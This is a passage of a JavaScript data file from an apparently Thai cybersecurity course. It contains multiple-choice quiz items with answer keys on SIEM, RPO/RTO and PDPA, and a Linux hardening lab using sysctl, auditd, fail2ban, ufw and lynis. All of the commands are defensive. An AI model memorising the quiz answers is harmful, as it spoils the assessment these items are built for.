        { type: 'mcq', q: 'Log ประเภทใดที่ควรส่งเข้า SIEM เป็นอันดับแรกเพราะคุ้มค่าที่สุด', opts: ['Log การพิมพ์เอกสาร', 'Log การยืนยันตัวตนทั้งหมด (AD, VPN, SSH, คลาวด์)', 'Log อุณหภูมิห้องเซิร์ฟเวอร์', 'Log การอัปเดตซอฟต์แวร์'], a: 1, why: 'การโจมตีเกือบทั้งหมดต้องผ่านการยืนยันตัวตนในบางจุด — log กลุ่มนี้จับได้ทั้ง brute force, credential stuffing และการใช้บัญชีที่ถูกยึด' },
        { type: 'mcq', q: 'RPO และ RTO ควรใครเป็นคนกำหนด', opts: ['ทีม IT กำหนดเองตามความสามารถของระบบ', 'ฝ่ายธุรกิจกำหนดจากผลกระทบต่อธุรกิจ แล้ว IT ออกแบบระบบให้ได้ตามนั้น', 'ผู้ขายอุปกรณ์', 'กำหนดตามงบประมาณที่เหลือ'], a: 1, why: 'RPO/RTO คือการตัดสินใจทางธุรกิจว่ายอมรับความเสี่ยงได้แค่ไหน แล้วจึงแปลงเป็นข้อกำหนดทางเทคนิคและงบประมาณ' },
        { type: 'multi', q: 'ข้อใดคือชั้นของ Defense in Depth (เลือกทุกข้อที่ถูก)', opts: ['Network segmentation', 'การอบรมพนักงาน', 'MFA และการจัดการสิทธิ์', 'การเลือกยี่ห้อคีย์บอร์ด'], a: [0, 1, 2], why: 'Defense in Depth ครอบคลุมตั้งแต่ physical, network, endpoint, application, data, identity ไปจนถึง people' },
        { type: 'mcq', q: 'ทำไม false positive rate ที่สูงจึงอันตราย', opts: ['ทำให้ SIEM ทำงานช้า', 'ทำให้ทีมเลิกอ่าน alert และพลาด alert ที่เป็นเหตุจริง', 'ทำให้เปลืองพื้นที่เก็บ log', 'ไม่อันตราย ยิ่งเยอะยิ่งปลอดภัย'], a: 1, why: 'alert fatigue เป็นสาเหตุที่ทำให้เหตุการณ์จริงถูกมองข้าม — ควรเริ่มจาก use case น้อยแต่แม่น แล้วค่อยขยาย' },
        { type: 'mcq', q: 'Tabletop exercise คืออะไร และมีประโยชน์อย่างไร', opts: ['การทดสอบเจาะระบบจริง', 'การนั่งซ้อมรับมือตามสถานการณ์สมมติ ใช้ต้นทุนต่ำแต่เห็นช่องโหว่ของกระบวนการชัดเจน', 'การติดตั้งอุปกรณ์ใหม่', 'การตรวจสอบบัญชี'], a: 1, why: 'ใช้เวลาไม่กี่ชั่วโมงและไม่กระทบระบบจริง แต่มักพบว่า "ไม่มีใครรู้ว่าต้องโทรหาใคร" หรือ "ไม่มีสิทธิ์เข้าถึงตอนกลางคืน"' },
        { type: 'multi', q: 'มาตรฐาน/กฎหมายใดที่องค์กรไทยที่เก็บข้อมูลส่วนบุคคลต้องปฏิบัติตาม (เลือกทุกข้อที่ถูก)', opts: ['PDPA', 'ISO 27001', 'PCI DSS', 'NIST CSF'], a: [0], why: 'PDPA เป็นกฎหมายที่บังคับใช้ ส่วน ISO 27001, NIST CSF และ CIS Controls เป็นมาตรฐานสมัครใจ และ PCI DSS บังคับเฉพาะองค์กรที่รับชำระด้วยบัตร' },
      ],
      labs: [{
        id: 'cy-l5-baseline',
        title: 'Lab 5 — วาง Security Baseline และระบบเฝ้าระวัง',
        brief: 'องค์กรกำลังทำตาม CIS Controls ให้คุณจัดทำ baseline บนเซิร์ฟเวอร์ต้นแบบ พร้อมเปิดระบบเก็บหลักฐานและส่ง log ออกนอกเครื่อง',
        device: 'linux-sec',
        tasks: [
          { t: 'ตั้ง hostname เป็น <code>sec-baseline</code>', hint: 'sudo hostnamectl set-hostname sec-baseline', check: s => s.hostname === 'sec-baseline' },
          { t: 'สแกนสถานะปัจจุบันด้วย lynis เพื่อเก็บคะแนนตั้งต้น', hint: 'sudo lynis audit system', check: (s, h) => said(h, /lynis/i) },
          { t: 'สร้างโฟลเดอร์ <code>/etc/sysctl.d</code>', hint: 'sudo mkdir -p /etc/sysctl.d', check: s => !!node(s, '/etc/sysctl.d') },
          { t: 'เขียนค่า <code>net.ipv4.tcp_syncookies = 1</code> ลง <code>99-hardening.conf</code>', hint: 'echo "net.ipv4.tcp_syncookies = 1" > /etc/sysctl.d/99-hardening.conf', check: s => /tcp_syncookies/.test(node(s, '/etc/sysctl.d/99-hardening.conf')?.content || '') },
          { t: 'เพิ่ม <code>kernel.randomize_va_space = 2</code> (ASLR) ต่อท้ายไฟล์', hint: 'echo "kernel.randomize_va_space = 2" >> /etc/sysctl.d/99-hardening.conf', check: s => /randomize_va_space/.test(node(s, '/etc/sysctl.d/99-hardening.conf')?.content || '') },
          { t: 'โหลดค่า sysctl ใหม่ทั้งระบบ', hint: 'sudo sysctl --system', check: s => s.sysctl['kernel.randomize_va_space'] === '2' },
          { t: 'เปิด <code>auditd</code> และตั้งให้เริ่มตอนบูต', hint: 'sudo systemctl start auditd → sudo systemctl enable auditd', check: s => s.services.auditd.active && s.services.auditd.enabled },
          { t: 'เพิ่ม audit rule เฝ้าไฟล์ <code>/etc/passwd</code>', hint: 'sudo auditctl -w /etc/passwd -p wa -k identity', check: (s, h) => said(h, /auditctl\s+-w/i) },
          { t: 'เปิด <code>fail2ban</code> และตั้งให้เริ่มตอนบูต', hint: 'sudo systemctl start fail2ban → sudo systemctl enable fail2ban', check: s => s.services.fail2ban.active && s.services.fail2ban.enabled },
          { t: 'ตั้ง firewall: default deny incoming แล้วอนุญาต SSH', hint: 'sudo ufw default deny incoming → sudo ufw allow 22/tcp', check: s => s.ufw.rules.some(r => /22/.test(r.to)) },
          { t: 'เปิดใช้งาน firewall', hint: 'sudo ufw enable', check: s => s.ufw.active },
          { t: 'ตั้ง timezone เป็น <code>Asia/Bangkok</code> เพื่อให้ log correlate ได้', hint: 'sudo timedatectl set-timezone Asia/Bangkok', check: s => s.timezone === 'Asia/Bangkok' },
          { t: 'สแกนซ้ำด้วย lynis เพื่อเทียบคะแนนหลังทำ baseline', hint: 'sudo lynis audit system', check: (s, h) => h.filter(c => /lynis/i.test(c)).length >= 2 },
          { t: 'สร้างรายงานสรุปลง <code>/home/analyst/baseline-report.txt</code>', hint: 'ss -tulpn > /home/analyst/baseline-report.txt', check: s => (node(s, '/home/analyst/baseline-report.txt')?.content || '').length > 10 },
        ],
      }],
    },
  }),
};
